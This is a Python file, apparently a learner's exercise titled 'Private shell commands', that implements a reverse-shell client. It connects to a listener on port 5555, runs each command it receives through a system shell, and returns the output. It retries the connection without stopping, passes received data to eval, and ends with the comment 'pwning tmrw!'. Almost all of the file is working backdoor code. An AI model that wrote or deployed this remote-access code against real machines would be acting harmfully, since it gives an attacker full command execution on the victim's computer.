# Day 10 - Private shell commands

import socket
import json
import time
import subprocess # 2
import os # 2

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

#########################

server_ip = ip_address() 
server_port = 5555 

#########################

def json_send(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body


def shell():
    while True:
        command = json_recv()
        if command[:3] == 'cd ':
            os.chdir(command[3:]) # 5
        elif command == 'ls':
            pass
        elif command == 'clear': # 6
            pass
        elif command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            json_send(result)


def connection():   
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    while True:
        time.sleep(0)
        try:
            client.connect((server_ip, server_port))
            shell()
            client.close()
            break
        except:
            connection()

connection()


########################

# 5     since we took [:3] from the command -> 'cd ', we are sending to perform the change directory method from os module. and we are taking the [3:] of the input.
#       ie. 'cd Downloads' -> os.chdir('Downloads') 
# 6     since our monitor is in the server. this has nothing to do with the input. we are performing pass each time clear is in the input.

########################

# pwning tmrw!